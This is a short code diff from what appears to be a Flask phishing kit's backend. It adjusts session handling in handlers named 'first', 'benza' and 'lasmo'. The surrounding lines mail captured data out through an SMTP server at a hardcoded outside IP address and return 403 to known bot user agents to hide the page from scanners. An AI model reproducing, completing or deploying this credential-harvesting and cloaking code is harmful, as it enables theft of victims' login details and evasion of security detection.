@@ -167,7 +167,7 @@ def first():
         with smtplib.SMTP("77.83.196.189", 6040) as server:
             server.login(sender_emaill, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
-        return redirect(url_for('benza', web=session.get('eman'), dman=session.get('ins'))
+        return redirect(url_for('benza', web=session.get('eman'))
 
 
 
@@ -220,7 +220,8 @@ def benza():
 def lasmo():
     userip = request.headers.get("X-Forwarded-For")
     useragent = request.headers.get("User-Agent")
-    
+    eman = session.get('eman')
+    dman = session.get('dman')
     if useragent in bot_user_agents:
         abort(403)  # forbidden
     
